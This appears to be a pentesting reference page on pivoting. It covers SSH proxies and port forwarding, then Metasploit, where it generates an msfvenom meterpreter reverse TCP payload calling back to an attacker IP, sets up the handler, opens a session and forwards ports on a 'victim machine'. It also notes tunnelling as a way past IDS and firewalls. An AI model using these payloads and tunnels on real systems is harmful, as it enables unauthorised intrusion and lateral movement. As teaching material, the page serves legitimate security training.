---
title: Proxy & Port forwarding
description: Desciption of two pivot techniques, port forwarding and proxy.
---

# Proxy & Port forwarding

**2 methods :**

- **Tunnelling/Proxying:** Creating a proxy type connection through a compromised machine in order to route all desired traffic into the targeted network. This could potentially also be _tunnelled_ inside another protocol (e.g. SSH tunnelling), which can be useful for evading a basic **I**ntrusion **D**etection **S**ystem (IDS) or firewall.
- **Port Forwarding:** Creating a connection between a local port and a single port on a target, via a compromised host.

Port Forwarding tends to be faster and more reliable, but only allows us to access a single port (or a small range) on a target device.

## Using SSH

### Proxy

**Proxy :** http://127.0.0.1:8080

```bash
ssh -D 8080 user@example.com -fN
```

**Proxy :** socks5://127.0.0.1:9050

```bash
ssh -g -D 9050 user@example.com -fN
```

### Port forwarding

The `example.com` machine has a web server running on port 8000 internally (not exposed to the internet). With the following command you can now access the web server from `http://localhost:4444`.

```bash
ssh -L 4444:127.0.0.1:8000 user@example.com -fN
```

- `-f` : Backgrounds ssh.
- `-N` : Do not execute a remote command.

## Using metasploit (meterpreter)

### Port forwarding

- Generate the exploit with `msfvenom`.

```bash
$ msfvenom -p 'linux/x64/meterpreter_reverse_tcp' LHOST=10.132.0.2 LPORT=9001 -f elf > exploit.bin
[-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 1037272 bytes
Final size of elf file: 1037272 bytes

$ file exploit.bin
exploit.bin: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), static-pie linked, with debug_info, not stripped
```

- Setup listener

```bash
$ msfconsole
...
msf6 > use exploit/multi/handler
msf6 exploit(multi/handler) > set LHOST ens4
LHOST => 10.132.0.2
msf6 exploit(multi/handler) > set LPORT 9001
LPORT => 9001
msf6 exploit(multi/handler) > set PAYLOAD linux/x64/meterpreter_reverse_tcp
PAYLOAD => linux/x64/meterpreter_reverse_tcp
msf6 exploit(multi/handler) > run

[*] Started reverse TCP handler on 10.132.0.2:9001
[*] Meterpreter session 1 opened (10.132.0.2:9001 -> 10.154.0.2:45462 ) at 2021-10-19 19:27:31 +0000

meterpreter >
```

- Do port forwarding

```
meterpreter > portfwd add -l 4444 -p 8000 -r 127.0.0.1
[*] Local TCP relay created: :4444 <-> 127.0.0.1:8000
meterpreter > portfwd list

Active Port Forwards
====================

   Index  Local           Remote        Direction
   -----  -----           ------        ---------
   1      127.0.0.1:8000  0.0.0.0:4444  Forward

1 total active port forwards.

meterpreter > portfwd delete -l 4444 -p 8000 -r 127.0.0.1
[*] Successfully stopped TCP relay on 0.0.0.0:4444
```

`-l` : Port on your local machine (attacker machine).
`-p` : Port on the remote machine (victim machine).
`-r` : Target host.

## Using chisel

- [Chisel](https://github.com/jpillora/chisel)